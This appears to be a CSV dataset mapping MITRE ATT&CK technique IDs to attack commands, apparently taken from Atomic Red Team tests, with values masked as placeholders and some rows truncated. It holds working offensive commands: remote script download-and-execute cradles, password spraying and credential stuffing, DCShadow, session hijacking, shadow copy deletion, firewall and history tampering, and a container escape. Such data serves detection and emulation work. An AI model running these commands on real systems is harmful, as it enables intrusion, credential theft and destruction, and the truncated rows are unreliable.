mitre_id,command
T1619,"for  bucket  in  ""$(aws  s3  ls  |  cut  -d  ""  ""  -f3)"";  do  aws  s3api  list-objects-v2  --bucket  $bucket  --output  text;  done"
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nofilemenu /t reg_dword /d 1 /f"
T1553,iex (iwr 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1553.004/src/remotecerttrust.ps1' -usebasicparsing)
T1489,sc.exe stop #{service_name}
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_247"" net start sesshijack"
T1578,gcloud compute snapshots create var_459
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/namedpipe/namedpipesystem.ps1')
T1132,echo -n 111-11-1111 | b64encode -r - curl -xpost var_498
T1105,sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
T1529,halt --reboot
T1556,"sudo sed -i ""var_441"
T1482,"dsquery * -filter ""(objectclass=trusteddomain)"" -attr *"
T1543,if [ ! -d ~\library\launchagents ]; then mkdir ~\library\launchagents; fi; sudo cp var_953
T1548,"mkdir ""\\?\c:\windows \system32\"" copy ""var_501"" ""\\?\c:\windows \system32\mmc.exe"" mklink c:\testbypass.exe ""\\?\c:\windows \system32\mmc.exe"""
T1135,net view \\var_138
T1547,"reg add ""hkcr\clsid\{645ff040-5081-101b-9f08-00aa002f954e}\shell\open\command"" /ve /d ""calc.exe"" /f"
T1562,#{flavor_command}
T1053,kubectl get cronjobs -n #{namespace}
T1127,"var_311"""
T1489,sudo systemctl stop var_245
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_243"""
T1132,"$plaintext  =  ([system.text.encoding]::utf8.getbytes(""var_165  -method  post  -body  $cyphertext  -disablekeepalive"
T1110,"cp $pathtoatomicsfolder\t1110.004\src\credstuffuserpass.txt \tmp\ for unamepass in $(cat \tmp\credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@var_420;done"
T1496,yes > \dev\null
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_360"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1562,"test=$(echo $histcontrol) if [ ""$histcontrol"" != ""ignoreboth"" ]; then export histcontrol=""ignoreboth""; fi history -c ls -la $histfile # "" ls -la $histfile"" if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi if [ ""$histcontrol"" != ""erasedups"" ]; then export histcontrol=""erasedups""; fi history -c ls -la $histfile ls -la $histfile ls -la $histfile if [ $(history |wc -l) -eq 2 ]; then echo ""their is only one entry for ls -la $histfile""; fi"
T1105,"# check if the folder exists, create it if it doesn't $folderpath = ""var_689"
T1119,mkdir %temp%\t1119_command_prompt_collection >nul 2>&1 dir c: \b \s .docx | findstr \e .docx for \r c:\ %f in (*.docx) do copy \y %f %temp%\t1119_command_prompt_collection
T1562,ufw disable
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_204"""
T1110,"if (""#{auth}"".tolower() -notin @(""ntlm"",""kerberos"")) { write-host ""only 'ntlm' and 'kerberos' auth methods are supported"" exit 1 } $domainusers = get-aduser -ldapfilter '(&(samaccounttype=805306368)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))' -server #{domain} | select-object -expandproperty samaccountname [system.reflection.assembly]::loadwithpartialname(""system.directoryservices.protocols"") | out-null $di = new-object system.directoryservices.protocols.ldapdirectoryidentifier(""#{domain}"",389) $domainusers | foreach-object { $user = $_ $password = '#{password}' $credz = new-object system.net.networkcredential($user, $password, ""#{domain}"") $conn = new-object system.directoryservices.protocols.ldapconnection($di, $credz, [system.directoryservices.protocols.authtype]::#{auth}) try { write-host "" [-] attempting ${password} on account ${user}."" $conn.bind() # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] ${user}:${password} are valid credentials!"" } catch { write-host $_.exception.message } } write-host ""end of password spraying"""
T1037,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_agent.plist /library/startupitems/atomic.sh start
T1484,"new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimedc -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimeoffsetdc -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtime -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimeoffset -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name enablesmartscreen -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name shellsmartscreenlevel -force"
T1580,aws ec2 describe-security-groups --profile var_215
T1040,pktmon.exe start --etw -f %temp%\t1040.etl timeout /t 5 >nul 2>&1 pktmon.exe stop
T1558,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore cmd.exe \c ""var_881 while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1098,"$credfile  =  ""var_840"
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt
T1613,docker build -t t1613 $pathtoatomicsfolder\t1613\src\ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)
T1059,$malcmdlets  =  var_503
T1049,$syntaxlist = var_338
T1496,yes > \dev\null
T1057,"start-process -filepath ""c:\temp\externalpayloads\pchunter_free\var_871"""
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 3"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_642
T1187,"&  ""var_661  write-host  ""end  of  petitpotam  attack"""
T1486,openssl enc var_150
T1486,openssl enc var_508
T1496,yes > \dev\null
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_241"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\createprocess\get-createprocesssystembind.ps1')
T1070,remove-smbshare -name #{share_name} remove-fileshare -name #{share_name}
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-beacon.ps1 -dohserver var_262"
T1543,sudo cp var_336
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1070,echo 0> #{log_path}
T1620,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  mimiload  -consoleoutput  -noninteractive
T1057,wmic  process  get  \format:list
T1217,where  \r  c:\users\  places.sqlite
T1078,gcloud config set project var_879
T1047,wmic \user:var_885
T1078,sysadminctl interactive -adduser art-tester -fullname artuser -password !pass123! -admin
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_628"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1027,"invoke-expression ""var_787"""
T1030,cd var_183
T1220,"wmic var_832"""
T1129,"var_250"""
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh
T1569,launchctl  submit  -l  var_305
T1491,"$url = ""var_739"
T1490,wmic.exe shadowcopy delete
T1573,$server_ip = var_297
T1133,"$extlist = var_782 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1049,$syntaxlist = var_280
T1571,echo  quit  |  telnet  var_814  exit  0
T1053,"$action = new-scheduledtaskaction -execute ""cmd.exe"" $trigger = new-scheduledtasktrigger -atlogon $user = new-scheduledtaskprincipal -groupid ""builtin\administrators"" -runlevel highest $set = new-scheduledtasksettingsset $object = new-scheduledtask -action $action -principal $user -trigger $trigger -settings $set register-scheduledtask atomictaskmodifed -inputobject $object $newaction = new-scheduledtaskaction -execute ""notepad.exe"" set-scheduledtask ""atomictaskmodifed"" -action $newaction"
T1072,# deploy 7-zip using chocolatey choco install -y 7zip
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_931"""
T1550,"var_328"""
T1098,"$x  =  get-random  -minimum  2  -maximum  9999  $y  =  get-random  -minimum  2  -maximum  9999  $z  =  get-random  -minimum  2  -maximum  9999  $w  =  get-random  -minimum  2  -maximum  9999  write-host  haha_$x$y$z  $fmm  =  get-localgroupmember  -group  administrators  |?{  $_.objectclass  -match  ""user""  -and  $_.principalsource  -match  ""local""}  |  select  name  foreach($member  in  $fmm)  {  if($member  -like  ""*administrator*"")  {  $account  =  $member.name.split(""\"")[-1]  #  strip  computername\  $originaldescription  =  (get-localuser  -name  $account).description  set-localuser  -name  $account  -description  ""atr:$account;$originaldescription"".substring(0,48)  #  keep  original  name  in  description  rename-localuser  -name  $account  -newname  ""haha_$x$y$z""  #  required  due  to  length  limitation  write-host  ""successfully  renamed  $account  account  on  ""  $env:computername  }  }"
T1546,"copy-item ""#{dll_path}"" c:\users\public\atomictest.dll -force reg add ""hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls"" /v ""atomictest"" /t reg_expand_sz /d ""c:\users\public\atomictest.dll"" /f if(#{reboot}){restart-computer}"
T1018,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=computer) #{optional_args}"
T1027,$originalcommand = 'var_743' $bytes = [system.text.encoding]::unicode.getbytes($originalcommand) $encodedcommand =[convert]::tobase64string($bytes) $encodedcommand powershell.exe -encodedcommand $encodedcommand
T1055,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1""  -usebasicparsing)  invoke-maldoc  -macrofile  ""var_629""  -officeproduct  ""word""  -sub  ""execute"""
T1220,"wmic var_632"""
T1217,"find \ -path ""*.mozilla\firefox\*\places.sqlite"" 2>\dev\null -exec echo {} >> var_357 2>\dev\null"
T1114,"powershell -executionpolicy bypass -command ""var_853"
T1134,"cd ""pathtoatomicsfolder\..\externalpayloads"" start-process .\badpotato.exe notepad.exe start-sleep -second 20 stop-process -name ""notepad"" -force -erroraction silentlycontinue stop-process -name ""badpotato"" -force -erroraction silentlycontinue"
T1112,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v proxyenable /t reg_dword /d 1 /f"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_929
T1571,echo quit | telnet var_321 exit 0
T1619,"try{$response = invoke-webrequest ""https:\\var_706 -append"
T1018,ip neighbour show
T1135,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1' -usebasicparsing); find-domainshare -checkshareaccess -verbose
T1611,if [ ! -d var_249 2>&1
T1652,lsmod
T1021,"echo  """"  |  ""var_492""  ""vim-cmd  hostsvc\enable_ssh"""
T1219,"start-process -wait -filepath ""var_816"" -argument ""\silent"" -passthru start-process 'c:\program files (x86)\ultraviewer\ultraviewer_desktop.exe'"
T1485,gcloud  config  set  project  var_921
T1049,"get-nettcpconnection | foreach-object { $p = get-process -id $_.owningprocess -erroraction silentlycontinue [pscustomobject]@{ local = ""$($_.localaddress):$($_.localport)"" remote = ""$($_.remoteaddress):$($_.remoteport)"" state = $_.state pid = $_.owningprocess process = if ($p) { $p.processname } else { $null } } } | sort-object state,process | format-table -autosize"
T1202,pcalua.exe -a var_826
T1563,"query  user  sc.exe  create  sesshijack  binpath=  ""cmd.exe  \k  tscon  var_267""  net  start  sesshijack"
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=\proc\1\ns\mnt"",""--"",""\bin\bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'"
T1082,"$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-seatbelt.ps1') invoke-seatbelt -command ""-group=all"""
T1221,"start  ""var_382"""
T1216,set comspec=var_176 cscript %windir%\system32\manage-bde.wsf
